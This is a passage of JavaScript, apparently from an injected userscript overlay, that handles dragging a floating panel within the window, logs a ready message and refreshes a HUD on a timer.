        offY = e.clientY - root.offsetTop;
        root.style.cursor = 'grabbing';
        e.preventDefault();
    };
    window.onmousemove = function(e){
        if(dragActive){
            var left = e.clientX - offX;
            var top = e.clientY - offY;
            left = Math.min(window.innerWidth - root.offsetWidth - 10, Math.max(10, left));
            top = Math.min(window.innerHeight - root.offsetHeight - 10, Math.max(10, top));
            root.style.left = left + 'px';
            root.style.right = 'auto';
            root.style.top = top + 'px';
        }
    };
    window.onmouseup = function(){
        dragActive = false;
        root.style.cursor = 'grab';
    };
    
    logConsole("UI Injected | Ready");
    syncData();
    setInterval(updateHUD, 500);
})();
